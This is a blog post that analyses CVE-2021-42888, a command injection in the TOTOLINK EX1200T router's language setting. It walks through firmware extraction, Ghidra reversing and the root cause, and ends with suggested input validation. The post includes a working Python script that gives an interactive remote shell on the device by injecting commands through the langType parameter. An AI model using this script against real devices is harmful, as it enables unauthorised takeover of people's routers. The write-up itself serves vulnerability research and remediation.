<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>CVE-2021-42888: TOTOLINK EX1200T Remote Command Injection - Zeyad Azima</title>
<meta name="description" content="Analyzing a remote command injection in TOTOLINK EX1200T device known as CVE-2021-42888. ">


  <meta name="author" content="Zeyad Azima">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="Zeyad Azima">
<meta property="og:title" content="CVE-2021-42888: TOTOLINK EX1200T Remote Command Injection">
<meta property="og:url" content="http://localhost:5000/iot%20exploitation/CVE_2021_42888/">


  <meta property="og:description" content="Analyzing a remote command injection in TOTOLINK EX1200T device known as CVE-2021-42888. ">



  <meta property="og:image" content="http://localhost:5000/assets/images/clf9btj1u3wq60knu00om57eu.png">





  <meta property="article:published_time" content="2023-03-15T00:00:00+08:00">





  

  


<link rel="canonical" href="http://localhost:5000/iot%20exploitation/CVE_2021_42888/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Zeyad Azima",
      "url": "http://localhost:5000/"
    
  }
</script>






<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Zeyad Azima Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/site_data/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/site_data/favicon-16x16.png">
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/site_data/logo.png" alt=""></a>
        
        <a class="site-title" href="/">
          Zeyad Azima
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/categories/#Security-Research">Security Research</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#MacOS">MacOS</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#IoT-Exploitation">IoT Exploitation</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#Defense-Evasion">Defense Evasion</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#General">General</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/#Certificates">Certificates</a>
            </li><li class="masthead__menu-item">
              <a href="/categories">All Categories</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/assets/images/site_data/avatar.jpg" alt="Zeyad Azima" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">Zeyad Azima</h3>
    
    
      <div class="author__bio" itemprop="description">
        <p>Brain Storming Stuff (Exploit Development, Reverse Engineering &amp; More)</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      
        
          
            <li><a href="mailto:contact@zeyadazima.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
          
        
          
            <li><a href="https://twitter.com/AzimaZeyad" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://www.linkedin.com/in/zer0verflow/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
          
        
          
            <li><a href="https://github.com/Zeyad-Azima" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/zeyadazima" rel="nofollow noopener noreferrer"><i class="fas fa-mug-hot" aria-hidden="true"></i><span class="label">Buy Me a Coffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="CVE-2021-42888: TOTOLINK EX1200T Remote Command Injection">
    <meta itemprop="description" content="Introduction">
    <meta itemprop="datePublished" content="2023-03-15T00:00:00+08:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">CVE-2021-42888: TOTOLINK EX1200T Remote Command Injection
</h1>
          
            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  12 minute read

</p>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu">
  <li><a href="#introduction">Introduction</a></li>
  <li><a href="#obtaining-the-firmware">Obtaining the Firmware</a></li>
  <li><a href="#the-analysis">The Analysis</a></li>
  <li><a href="#final-thoughts">Final Thoughts</a></li>
  <li><a href="#conclusion">Conclusion</a>
    <ul>
      <li><a href="#references">References</a></li>
    </ul>
  </li>
</ul>

            </nav>
          </aside>
        
        <h1 id="introduction"><strong>Introduction</strong></h1>

<p>A vulnerability discovered in TOTOLINK <code class="language-plaintext highlighter-rouge">EX1200T</code> model known as <code class="language-plaintext highlighter-rouge">CVE-2021-42888</code> which lead to Remote Command Injection, as a results anyone exploit this vulnerability by sending a crafted request through <code class="language-plaintext highlighter-rouge">langType</code> parameter when setting the language will be able to to inject arbitrary commands and will get executed by the device. Note:(<code class="language-plaintext highlighter-rouge">Everything you obtain here is for educational purposes, Don't use or abuse any bug against any target without permissions</code>)</p>

<h1 id="obtaining-the-firmware"><strong>Obtaining the Firmware</strong></h1>

<p>Before we start we would need the firmware of the device, Therefore We can take a static look at the code and how it works to understand more. So, what we need is the vulnerable Firmware for the device which is <code class="language-plaintext highlighter-rouge">V4.1.2cu.5215</code> and we have many ways to do it:</p>

<ul>
  <li>
    <p>You can search for the firmware on the official website for the vendor.</p>
  </li>
  <li>
    <p>Download it from any other source (after someone already dump it from the device and published it).</p>
  </li>
  <li>
    <p>Dump the firmware through <code class="language-plaintext highlighter-rouge">UART</code>, You could read a detailed blog from <a href="https://www.cyberark.com/resources/threat-research-blog/accessing-and-dumping-firmware-through-uart">Here</a>.</p>
  </li>
  <li>
    <p>Also, you could contact the support to provide you with the firmware.</p>
  </li>
  <li>
    <p>Finally dumping the firmware using <code class="language-plaintext highlighter-rouge">CH341A</code> Mini programmer USB, You could read a detailed blog from <a href="https://www.blackhillsinfosec.com/dumping-firmware-with-the-ch341a-programmer/">Here</a>.</p>
  </li>
</ul>

<p>In my case, I found the firmware on the vendor website. Now, Let’s extract the firmware using <code class="language-plaintext highlighter-rouge">binwalk</code> tool as the following <code class="language-plaintext highlighter-rouge">binwalk -e --run-as=root "TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web"</code> and here is the output:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ls
TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web
$ sudo binwalk -e --run-as=root "TOTOLINK_C8180E-1C_EX1200T_WX022_8197F_SPI_8M64M_V4.1.2cu.5215_B20210330_ALL.web"
[sudo] password for azima:

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
76            0x4C            JFFS2 filesystem, little endian
209052        0x3309C         Zlib compressed data, compressed
209388        0x331EC         Zlib compressed data, compressed
210144        0x334E0         Zlib compressed data, compressed
210832        0x33790         JFFS2 filesystem, little endian
231428        0x38804         Zlib compressed data, compressed
231988        0x38A34         Zlib compressed data, compressed
232548        0x38C64         Zlib compressed data, compressed
233116        0x38E9C         Zlib compressed data, compressed
233560        0x39058         JFFS2 filesystem, little endian
254344        0x3E188         Zlib compressed data, compressed
254696        0x3E2E8         JFFS2 filesystem, little endian
255224        0x3E4F8         Zlib compressed data, compressed
256064        0x3E840         JFFS2 filesystem, little endian
321636        0x4E864         LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 6526520 bytes
</code></pre></div></div>

<p>And as i am using <code class="language-plaintext highlighter-rouge">Windows Subsystem Linux (WSL)</code>, Here we can browser our firmware normally:</p>

<p><img src="/assets/images/c93de2a7e3193ab20dbbe060de92a184" alt="" /></p>

<p> </p>

<h1 id="the-analysis"><strong>The Analysis</strong></h1>

<p>It’s the time for the analysis. We will need <code class="language-plaintext highlighter-rouge">Burp Suite</code> to see how is the request of the Language set looks like on the device before it’s go to the device web server and how/why it executes the value as a command. When we open the web panel, We can notice that there is a menu list on the right-top that contains the language.</p>

<p><img src="/assets/images/eebfd0b8a0d8bde983da41166d91a3a7" alt="" /></p>

<p>Now, when we change the language and look at requests made through burp suite will find the following:</p>

<p><img src="/assets/images/26b9d653a75c1addf0d4332e8b93e065" alt="" /></p>

<p>And by navigating to the request made to change the language which has the <code class="language-plaintext highlighter-rouge">langType</code> parameter the request is as the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.254
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 68
Origin: http://192.168.0.254
DNT: 1
Connection: close
Referer: http://192.168.0.254/login.asp

{"topicurl":"setting/setLanguageCfg","langType":"en","langFlag":"1"}
</code></pre></div></div>

<p>Let’s go with <code class="language-plaintext highlighter-rouge">Ghidra</code> and reverse the <code class="language-plaintext highlighter-rouge">cstecgi.cgi</code> file. Now, By going to the file and check it with the <code class="language-plaintext highlighter-rouge">file</code> command, We can see it’s an <code class="language-plaintext highlighter-rouge">ELF 32bit MIPS</code> file:</p>

<p><img src="/assets/images/fd45b0a14a9146d784af5b3479d013f4" alt="" /></p>

<p>Open it and create a new project i named it <code class="language-plaintext highlighter-rouge">EX1200T</code> for the device name and drop the <code class="language-plaintext highlighter-rouge">cstecgi.cgi</code> file into the project:</p>

<p><img src="/assets/images/21b36004ac5f64751e35c4c5b38cc320" alt="" /></p>

<p>After that open the file using <code class="language-plaintext highlighter-rouge">Code Browser</code> within <code class="language-plaintext highlighter-rouge">Ghidra</code>:</p>

<p><img src="/assets/images/4dd89416438b54d4cc83e5be4dff9927" alt="" /></p>

<p>Then, analysis the file:</p>

<p><img src="/assets/images/55b0384d92543710eaba5a607fafe5d6" alt="" /></p>

<p>Navigating to <code class="language-plaintext highlighter-rouge">Symbol Tree</code> and let’s check out the functions:</p>

<p><img src="/assets/images/16b446fb44bc3a80494d826d68696476" alt="" /></p>

<p>After going through the functions clearly inside <code class="language-plaintext highlighter-rouge">FUN_00400dd8</code> function we can see the following lines of codes. But, there is no thing interesting and it’s all about functions calling other functions:</p>

<p><img src="/assets/images/16392dbc6f73a4711bf4283045ac39dd" alt="" /></p>

<p>We just can see that <code class="language-plaintext highlighter-rouge">httpStatus</code>, <code class="language-plaintext highlighter-rouge">redirectURL</code> &amp; <code class="language-plaintext highlighter-rouge">responseParam</code> being passed to some unclear functions.Also, If we search for any string contains the work <code class="language-plaintext highlighter-rouge">lang</code>, We can see there is nothing can be found:</p>

<p><img src="/assets/images/55ac63d3515b300a5f41fd5314fcfa26" alt="" /></p>

<p>But, You can see under <code class="language-plaintext highlighter-rouge">\squashfs-root\lib\cste_modules</code> folder that there are libraries named as the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>app.so
cloudupdate.so
global.so
lan.so
product.so
system.so
upgrade.so
wireless.so
wps.so
</code></pre></div></div>

<p>After reversing this libraries you will know that it’s clearly used by the <code class="language-plaintext highlighter-rouge">cstecgi.cgi</code> to perform different operations and changes through the device panel. Let’s identify which one perform the changing language process by searching through the following <code class="language-plaintext highlighter-rouge">Bash</code> one liner using <code class="language-plaintext highlighter-rouge">strings</code> command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>for i in $(ls -la | awk '{print $9}' | grep ".so"); do echo ""; echo "Lib Name: $i"; strings $i | grep "langType"; done
</code></pre></div></div>

<p>The above line will print the library name after this will run the <code class="language-plaintext highlighter-rouge">strings</code> command on the library to get any string has the work <code class="language-plaintext highlighter-rouge">langType</code> and will print the results under the library name. Therefore, we will be able to know which library contains the <code class="language-plaintext highlighter-rouge">language changing</code> process or anything related. Command output:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Lib Name: Fastjson.txt

Lib Name: app.so

Lib Name: cloudupdate.so

Lib Name: global.so
langType

Lib Name: lan.so

Lib Name: product.so

Lib Name: system.so

Lib Name: upgrade.so

Lib Name: wireless.so

Lib Name: wps.so
</code></pre></div></div>

<p>And as we can see it’s with-in the <code class="language-plaintext highlighter-rouge">global.so</code> library, As we did with the <code class="language-plaintext highlighter-rouge">cstecgi.cgi</code> file. Let’s do the same with the library with <code class="language-plaintext highlighter-rouge">Ghidra</code>. After opening the <code class="language-plaintext highlighter-rouge">Functions</code> tab under <code class="language-plaintext highlighter-rouge">Symbol Tree</code> we can notice the <code class="language-plaintext highlighter-rouge">setLanguageCfg</code> function:</p>

<p><img src="/assets/images/b9bada249c12a10f4dd22cc6333287c3" alt="" /></p>

<p>So, we can say the language process is as the following:</p>

<p><img src="/assets/images/490c8f502d7074fbb9d26837f345cddf" alt="" /></p>

<p>Now, Let’s navigate to the function and understand what this function do and how it works. First the function start by taking 3 parameters</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>undefined4 setLanguageCfg(undefined4 param_1,undefined4 param_2,undefined4 param_3)
</code></pre></div></div>

<p>Which are <code class="language-plaintext highlighter-rouge">param_1</code>, <code class="language-plaintext highlighter-rouge">param_2</code> and <code class="language-plaintext highlighter-rouge">param_3</code>. By going through the rest of the code you gonna see that mostly are declaring of variables, Until we reach the line number <code class="language-plaintext highlighter-rouge">31</code>:</p>

<p><img src="/assets/images/a21dc41a7bf11a305610b094dc24453f" alt="" /></p>

<p>We can see here it’s created 2 variables:</p>

<ul>
  <li>
    <p><code class="language-plaintext highlighter-rouge">param2</code>: which stores the value that the <code class="language-plaintext highlighter-rouge">websGetVar()</code> function will return which obvius that it will return the value of <code class="language-plaintext highlighter-rouge">langType</code> and assign it to <code class="language-plaintext highlighter-rouge">param2</code> and if there is no value, It will assign the <code class="language-plaintext highlighter-rouge">""</code> to <code class="language-plaintext highlighter-rouge">param2</code> which is empty string.</p>
  </li>
  <li>
    <p><code class="language-plaintext highlighter-rouge">__nptr</code>: which stores the value that the <code class="language-plaintext highlighter-rouge">websGetVar()</code> function will return which obvius that it will return the value of <code class="language-plaintext highlighter-rouge">langFlag</code> and assign it to <code class="language-plaintext highlighter-rouge">__nptr</code> and if there is no value, It will assign the <code class="language-plaintext highlighter-rouge">1</code> to <code class="language-plaintext highlighter-rouge">__nptr</code>.</p>
  </li>
</ul>

<p>From what we saw we can change these variable names to the names of the request parameters and the call for the <code class="language-plaintext highlighter-rouge">apmib_get()</code> function is for retrieving a value from a data structure and storing it in <code class="language-plaintext highlighter-rouge">param2</code> for later use. By complete reading through the code:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>local_1c = atoi(langFlag);
apmib_set(0x1777,&amp;local_1c);
</code></pre></div></div>

<p>the <code class="language-plaintext highlighter-rouge">local_1c</code> stores the value of <code class="language-plaintext highlighter-rouge">langFlag</code> which converted by <code class="language-plaintext highlighter-rouge">atoi()</code> function which converts a string of characters representing an integer value into an actual integer value. Then, again <code class="language-plaintext highlighter-rouge">apmib_get()</code> function is retrieving a value from a data structure and storing it in <code class="language-plaintext highlighter-rouge">local_1c</code> for later use. After that in the following lines:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  iVar1 = f_exists("/mnt/custom/product.ini");
  if (iVar1 != 0) {
    sprintf(acStack_140,"helpUrl_%s",langType);
    inifile_get_string("/mnt/custom/product.ini","PRODUCT",acStack_140,&amp;local_40);
    apmib_set(0x1bc8,&amp;local_40);
  }
</code></pre></div></div>

<p>Here the <code class="language-plaintext highlighter-rouge">iVar1</code> stores the return value of the <code class="language-plaintext highlighter-rouge">f_exists</code> function and it’s a custom function defined elsewhere in the code which checks if the <code class="language-plaintext highlighter-rouge">/mnt/custom/product.ini</code> file exists or no. Then, there is <code class="language-plaintext highlighter-rouge">if</code> condition checks if the value of <code class="language-plaintext highlighter-rouge">iVar1</code> is not equal to <code class="language-plaintext highlighter-rouge">0</code> which mean that the file <code class="language-plaintext highlighter-rouge">/mnt/custom/product.ini</code> exists. If the condition is true the <code class="language-plaintext highlighter-rouge">sprintf</code> function will format a string and store it in <code class="language-plaintext highlighter-rouge">acStack_140</code> and the formatted string consists of the literal string <code class="language-plaintext highlighter-rouge">helpUrl_</code> is followed by the value of the variable <code class="language-plaintext highlighter-rouge">langType</code>. Then, <code class="language-plaintext highlighter-rouge">apmib_get()</code> function is retrieving a value from a data structure and storing it in <code class="language-plaintext highlighter-rouge">local_40</code> for later use. Now, Coming to the following lines of codes is the place where the problem happens:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apmib_update_web(4);
CsteSystem("rm -f /web_cste/js/language.js 1&gt;/dev/null 2&gt;&amp;1",0);
sprintf(acStack_140,"/web_cste/js/language_%s.js",langType);
sprintf(acStack_140,"ln -s /web_cste/js/language_%s.js /web_cste/js/language.js 1&gt;/dev/null 2&gt;&amp;1",
      langType);
CsteSystem(acStack_140,0);
websSetCfgResponse(param_1,param_3,&amp;DAT_0001eca4,"reserv");
return 0;
</code></pre></div></div>

<p>First, <code class="language-plaintext highlighter-rouge">apmib_update_web(4)</code> This function updating some configuration settings on the device, Moving to the next line which is a call to a custom function from it’s name and arguments we can see it’s executing commands and the command is <code class="language-plaintext highlighter-rouge">rm -f /web_cste/js/language.js 1&gt;/dev/null 2&gt;&amp;1</code> and it’s clearly to remove the <code class="language-plaintext highlighter-rouge">/web_cste/js/language.js</code> file &amp; the <code class="language-plaintext highlighter-rouge">1&gt;/dev/null</code> and <code class="language-plaintext highlighter-rouge">2&gt;&amp;1</code> redirection operators are used to suppress output from the command. Then, <code class="language-plaintext highlighter-rouge">sprintf()</code> function format a string into <code class="language-plaintext highlighter-rouge">acStack_140</code> and The formatted string will be <code class="language-plaintext highlighter-rouge">/web_cste/js/language_[langType].js</code> and here where is the root cause of the problem cause the input is not filtered and by going to the following line <code class="language-plaintext highlighter-rouge">CsteSystem(acStack_140,0);</code> use <code class="language-plaintext highlighter-rouge">CsteSystem()</code> function again to execute the command stored in <code class="language-plaintext highlighter-rouge">acStack_140</code> which includes the <code class="language-plaintext highlighter-rouge">langType</code> value that can be manipulated by the user &amp; In this case, The user can include malicious input. Let’s now exploit it. I connected the device through <code class="language-plaintext highlighter-rouge">telnet</code> services first:</p>

<p><img src="/assets/images/59eecc595413526244937fdfb958c75a" alt="" /></p>

<p>Now, Let’s go to <code class="language-plaintext highlighter-rouge">Burp Suite</code> and manipulate the request and show a PoC for the vulnerability:</p>

<p><img src="/assets/images/1c805c850e1a0b6a2b7599dc527e2da4" alt="" /></p>

<p>We can see our request and response is successfully and Basically we executed a command to print out the <code class="language-plaintext highlighter-rouge">CVE</code> number and store it inside <code class="language-plaintext highlighter-rouge">poc.txt</code> in the <code class="language-plaintext highlighter-rouge">/tmp</code> directory and if we navigate to the directory we can see clearly our file there and the <code class="language-plaintext highlighter-rouge">CVE</code> number:</p>

<p><img src="/assets/images/25fd01fd7933de695422940ca8f0af6a" alt="" /></p>

<p>But, We can see that it ends with <code class="language-plaintext highlighter-rouge">.js</code>, So we can print a new line or separate it with <code class="language-plaintext highlighter-rouge">;</code> which separate commands in shell:</p>

<p><img src="/assets/images/a824909cbe195a3ad06a8a38a0aa2078" alt="" /></p>

<p>And here is it working well. Now, We can automate this process using python:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import requests
import sys

print(f"[*] Target: {sys.argv[1]} \n")
url = f"http://{sys.argv[1]}/cgi-bin/cstecgi.cgi"
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}

while True:
    command = input(f"{sys.argv[1]}@shell# ")
    json = {"langFlag": "1", "langType": f";{command} &gt; /web_cste/res.txt;",
            "topicurl": "setting/setLanguageCfg"}
    req1 = requests.post(url, headers=headers, json=json)
    if req1.status_code == 200:
        print(f"[+] Command: {command}\n")
        req2 = requests.get(f"http://{sys.argv[1]}/res.txt", headers=headers)
        print("[+] Results:")
        print(req2.text)
        json = {"langFlag": "1", "langType": f";rm -rf /web_cste/res.txt;",
                "topicurl": "setting/setLanguageCfg"}
        requests.post(url, headers=headers, json=json)
    else:
        print("[-] Error Command failed")
</code></pre></div></div>

<p>So, Basically the code will take a target as a first argument and then the command from the user after that will send the command and save the results in <code class="language-plaintext highlighter-rouge">res.txt</code> file in the web root directory so it can be access in public, After that request the <code class="language-plaintext highlighter-rouge">res.txt</code> file and print out it’s output which also is the command out put then it will delete it.</p>

<p><img src="/assets/images/79f636ea24ff36246b34fe8bf58cc0c9" alt="" /></p>

<h1 id="final-thoughts"><strong>Final Thoughts</strong></h1>

<p>The developer shall use an <code class="language-plaintext highlighter-rouge">Asp</code> endpoint to change the language as a different option instead of executing commands to move the <code class="language-plaintext highlighter-rouge">JS</code> files responsiable for the language, But, In our case of this code there are many solutions to make sure it will be hard for the user to escape the default command and inject malicious command as the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// Define an array of languages
char* languages[] = {"en", "ar", "ch"};

// Get the number of languages in the array
int numLanguages = sizeof(languages) / sizeof(languages[0]);

// Get the value of the langType parameter from the HTTP request
langType = (char*)websGetVar(param_2, "langType", "");

// Check if langType has length of 2, exit without executing commands if it doesn't
if (strlen(langType) != 2) {
return 0;
}

// Check if langType is included in the languages array, exit without executing commands if it's not
int isIncluded = 0;
for (int i = 0; i &lt; numLanguages; i++) {
if (strcmp(langType, languages[i]) == 0) {
isIncluded = 1;
break;
}
}
if (!isIncluded) {
return 0;
}

// Remove the existing language.js file
CsteSystem("rm -f /web_cste/js/language.js 1&gt;/dev/null 2&gt;&amp;1", 0);

// Set up the path for the new language.js file and create a symbolic link to it
sprintf(acStack_140, "/web_cste/js/language_%s.js", langType);
sprintf(acStack_140, "ln -s /web_cste/js/language_%s.js /web_cste/js/language.js 1&gt;/dev/null 2&gt;&amp;1", langType);
CsteSystem(acStack_140, 0);

// Set the langType and langFlag parameters in the system
apmib_set(0x1772, langType);
langFlag = (char*)websGetVar(param_2, "langFlag", "1");
local_1c = atoi(langFlag);
apmib_set(0x1777, &amp;local_1c);

// Check if the product.ini file exists and set the helpUrl parameter in the system
iVar1 = f_exists("/mnt/custom/product.ini");
if (iVar1 != 0) {
sprintf(acStack_140, "helpUrl_%s", langType);
inifile_get_string("/mnt/custom/product.ini", "PRODUCT", acStack_140, &amp;local_40);
apmib_set(0x1bc8, &amp;local_40);
}

// Update the web configuration
apmib_update_web(4);

// Remove the existing language.js file
CsteSystem("rm -f /web_cste/js/language.js 1&gt;/dev/null 2&gt;&amp;1", 0);

// Set up the path for the new language.js file and create a symbolic link to it
sprintf(acStack_140, "/web_cste/js/language_%s.js", langType);
sprintf(acStack_140, "ln -s /web_cste/js/language_%s.js /web_cste/js/language.js 1&gt;/dev/null 2&gt;&amp;1", langType);
CsteSystem(acStack_140, 0);

// Set the response and return 0
websSetCfgResponse(param_1, param_3, &amp;DAT_0001eca4, "reserv");
return 0;
</code></pre></div></div>

<p>Now, we created an array then condition checks if it is a valid two-letter language code by comparing it with the values in the languages array. If the <code class="language-plaintext highlighter-rouge">langType</code> parameter is not valid, the code exits without executing further commands.</p>

<p> </p>

<h1 id="conclusion"><strong>Conclusion</strong></h1>

<p>In this analysis we saw the root cause of the issue and how it can be solved in an example code, Also how we can analysis the unclear decompiled code to understand as much as we can of the code and make it clear.Finally, You have to keep each code under it’s condition.</p>

<p> </p>

<h2 id="references"><strong>References</strong></h2>

<ul>
  <li>
    <p><a href="https://www.totolink.net/home/news/me_name/id/39/menu_listtpl/DownloadC.html">https://www.totolink.net/home/news/me_name/id/39/menu_listtpl/DownloadC.html</a></p>
  </li>
  <li>
    <p><a href="https://github.com/p1Kk/vuln/blob/dcc2b75ab49f8cb0bdadf6f3c5d6b379a73e57c5/totolink_ex1200t_langtype_rce.md">https://github.com/p1Kk/vuln/blob/dcc2b75ab49f8cb0bdadf6f3c5d6b379a73e57c5/totolink_ex1200t_langtype_rce.md</a></p>
  </li>
  <li>
    <p>https://ghidra-sre.org/</p>
  </li>
  <li>
    <p><a href="https://github.com/scriptingxss/owasp-fstm/releases/download/v1.0/Firmware_Security_Testing_Methodology_Version1.pdf">https://github.com/scriptingxss/owasp-fstm/releases/download/v1.0/Firmware_Security_Testing_Methodology_Version1.pdf</a></p>
  </li>
</ul>

<p>#CVE-2021-42888</p>

        
      </section>

      <footer class="page__meta">
        
        


  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#iot-exploitation" class="page__taxonomy-item" rel="tag">IoT Exploitation</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-03-15T00:00:00+08:00">March 15, 2023</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/iot%20exploitation/CVE_2021_42887/" class="pagination--pager" title="CVE-2021-42887: TOTOLINK EX1200T LOGIN BYPASS
">Previous</a>
    
    
      <a href="/iot%20exploitation/CVE_2021_42886/" class="pagination--pager" title="CVE-2021-42886: TOTOLINK EX1200T Information disclosure vulnerability
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
      
        
      
        
      
        
      
        
      
        
      
    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

